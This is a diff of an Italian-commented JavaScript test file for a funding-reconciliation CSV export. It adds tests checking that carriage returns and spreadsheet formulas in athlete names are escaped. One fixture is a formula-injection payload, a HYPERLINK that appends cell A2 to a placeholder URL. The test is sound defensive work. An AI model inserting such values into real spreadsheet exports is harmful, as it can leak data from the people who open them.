@@ -53,6 +53,39 @@ const periodo = (overrides) => ({
 
 const NOMI = { "atleta-1": "Rossi Mario", "atleta-2": "Bianchi Anna" };
 
+/**
+ * Una riga di riconciliazione minima, per le prove sul **tracciato**: qui non
+ * interessa il calcolo, interessa cosa finisce dentro una cella.
+ */
+const RIGA_BASE = {
+  athleteId: "atleta-1",
+  athleteName: "Rossi Mario",
+  voucherCode: "V-1",
+  periodIndex: 0,
+  periodLabel: "Ottobre",
+  periodStart: "2026-10-01",
+  periodEnd: "2026-10-31",
+  measuredValue: 10,
+  requirementMin: 8,
+  requirementUnit: "hours",
+  requirementMet: true,
+  eligibleAmount: 50,
+  accruedAmount: 50,
+  unaccruedAmount: 0,
+  status: "accrued",
+};
+
+const TOTALI_VUOTI = {
+  athletes: 1,
+  periods: 1,
+  periodsMet: 1,
+  assignedAmount: 50,
+  eligibleAmount: 50,
+  accruedAmount: 50,
+  unaccruedAmount: 0,
+  reportedAmount: 0,
+};
+
 const build = (accruals) =>
   reconciliation.buildFundingReconciliation({
     enrollments: ISCRIZIONI,
@@ -217,4 +250,58 @@ test("senza righe il CSV ha comunque l'intestazione", () => {
 
   assert.equal(csv.split("\r\n").length, 1);
   assert.ok(csv.startsWith("Atleta;"));
+});
+
+/**
+ * ===========================================================================
+ * Tredicesima tornata — il tracciato non e piu una copia privata
+ * ===========================================================================
+ *
+ * Qui viveva un `escape` scritto a mano, e `src/lib/csv.ts` esiste
+ * dichiaratamente per ritirarlo. Le due differenze non erano di stile, e chi
+ * apre questo file e per definizione la persona che sta riconciliando con un
+ * ente pubblico, in Excel.
+ */
+
+test("un nome con un ritorno a capo non spezza la riga in due", () => {
+  const csv = reconciliation.toReconciliationCsv({
+    rows: [
+      {
+        ...RIGA_BASE,
+        athleteName: "Rossi\rMario",
+      },
+    ],
+    totals: TOTALI_VUOTI,
+  });
+
+  const righe = csv.split("\r\n");
+
+  assert.equal(
+    righe.length,
+    2,
+    "intestazione piu una riga: un `\r` non protetto ne inventava una terza, " +
+      "cioe una beneficiaria che non esiste dentro una rendicontazione pubblica",
+  );
+  assert.match(righe[1], /^"Rossi\rMario"/);
+});
+
+test("una formula in un nome esce come testo, non come formula", () => {
+  const csv = reconciliation.toReconciliationCsv({
+    rows: [
+      {
+        ...RIGA_BASE,
+        athleteName: '=HYPERLINK("http://esempio.test/?d"&A2;"Apri")',
+      },
+    ],
+    totals: TOTALI_VUOTI,
+  });
+
+  const riga = csv.split("\r\n")[1];
+
+  assert.equal(
+    riga.startsWith('"='),
+    false,
+    "una cella che comincia per «=» viene eseguita da Excel all'apertura",
+  );
+  assert.match(riga, /^"'=HYPERLINK/);
 });
